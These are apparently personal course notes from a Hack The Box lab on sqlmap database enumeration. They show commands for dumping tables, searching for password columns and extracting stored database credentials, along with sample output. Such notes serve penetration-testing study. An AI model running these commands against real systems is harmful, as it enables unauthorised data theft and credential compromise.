---
title: c-Enumeration
draft: false
tags:
---
## Database Enumeration

- Database version banner (switch `--banner`)
- Current user name (switch `--current-user`)
- Current database name (switch `--current-db`)
- Checking if the current user has DBA (administrator) rights (switch `--is-dba`)

e.g

```shell-session
jadu101@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

## Table Enumeration

Use `--tables` option with DB named specified with `-D` option to get a list of tables:

```shell-session
jadu101@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

After spotting the table name of interest, retrieve its content using `--dump` and `-T` option:

```shell-session
jadu101@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

## Table and Row Enumeration

When the table has many columns or rows, we can specify column using `-C` flag:

```shell-session
jadu101@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

We can specify rows using `--start` and `--stop` options:

```shell-session
jadu101@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

## Conditional Enumeration

If we want to look for name that starts with `f`:

```shell-session
jadu101@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

...SNIP...
Database: testdb

Table: users
[1 entry]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
+----+--------+---------+
```


## Advanced Database Enumeration

### DB Schema Enumeration

We can retrieve the structure of all tables so that we can have a complete overview of the database.

`--schema` switch

```shell-session
jadu101@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema

...SNIP...
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+
```

### Searching for Data

We can use `--search` option to look for data interested.

e.g Look for all of the table names containing the keyword `user`:

```shell-session
jadu101@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
```

e.g Look for all of the column names based on the keyword `pass`:

```shell-session
jadu101@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass

...SNIP...
columns LIKE 'pass' were found in the following databases:
Database: owasp10
Table: accounts
[1 column]
+----------+------+
| Column   | Type |
+----------+------+
| password | text |
+----------+------+
```

### Password Enum and Crack

We can use `--passwords` switch to dump the content of system tables containing database-specific credentials:

```shell-session
jadu101@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

